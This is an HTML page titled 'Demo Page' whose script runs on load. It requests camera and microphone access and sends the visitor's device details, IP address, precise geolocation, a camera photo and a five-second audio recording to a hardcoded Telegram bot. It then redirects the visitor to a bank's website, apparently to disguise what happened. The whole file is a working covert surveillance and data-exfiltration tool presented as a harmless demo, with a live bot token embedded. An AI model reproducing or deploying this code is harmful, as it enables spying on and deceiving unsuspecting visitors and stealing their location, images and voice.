<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Demo Page</title>
  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
</head>
<body>
<script>
const botToken = "7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY";
const chatId   = "1538488453";

let camStream;
let micStream;

// ==== Ø¥Ø±Ø³Ø§Ù„ Ù†Øµ ====
function sendText(t){
  axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    chat_id: chatId,
    text: t
  });
}

// ==== Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ====
async function sendDeviceInfo(){
  let ip = "Unknown";
  try {
    let r = await fetch("https://api.ipify.org?format=json");
    ip = (await r.json()).ip;
  }catch{}

  sendText(
    "ðŸ“± Device Info:\n" +
    "UserAgent: " + navigator.userAgent + "\n" +
    "Platform: " + navigator.platform + "\n" +
    "Screen: " + screen.width + "x" + screen.height + "\n" +
    "IP: " + ip
  );
}

// ==== Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ====
function sendLocation(){
  navigator.geolocation.getCurrentPosition(
    pos => {
      sendText(
        "ðŸ“ Location:\nLat: " + pos.coords.latitude +
        "\nLon: " + pos.coords.longitude +
        "\nAcc: " + pos.coords.accuracy + "m"
      );
    },
    err => sendText("Location Error: " + err.message),
    { enableHighAccuracy: true }
  );
}

// ==== Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ====
function takePhoto(){
  const video = document.createElement("video");
  video.srcObject = camStream;
  video.play();

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  video.onplaying = () => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0);

    canvas.toBlob(blob => {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("photo", blob, "cam.jpg");
      axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, fd);
    }, "image/jpeg", 0.7);
  };
}

// ==== ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª 5 Ø«ÙˆØ§Ù†Ù ====
function recordAudio(){
  return new Promise(resolve => {
    const rec = new MediaRecorder(micStream);
    const chunks = [];

    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const blob = new Blob(chunks, { type: "audio/webm" });
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("audio", blob, "mic.webm");
      axios.post(`https://api.telegram.org/bot${botToken}/sendAudio`, fd);
      resolve();
    };

    rec.start();
    setTimeout(() => rec.stop(), 5000);
  });
}

// ==== Ø¯Ø§Ù„Ø© ØªØ£Ø®ÙŠØ± ====
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ==== ØªØ´ØºÙŠÙ„ ÙƒÙ„ Ø´ÙŠØ¡ ====
async function startDemo(){
  try {
    [camStream, micStream] = await Promise.all([
      navigator.mediaDevices.getUserMedia({ video:true }),
      navigator.mediaDevices.getUserMedia({ audio:true })
    ]);

    sendDeviceInfo();
    sendLocation();
    takePhoto();
    await recordAudio();

    // ===== Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ø¨Ù„ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ =====
    const waitTime = 7000; // 7000 Ù…Ù„ÙŠ Ø«Ø§Ù†ÙŠØ© = 7 Ø«ÙˆØ§Ù†ÙŠ
    await delay(waitTime);

    window.location.href = "https://kuraimibank.com/ar/";
  } catch(e) {
    sendText("Permission Error: " + e.message);
  }
}

startDemo();
</script>
</body>
</html>
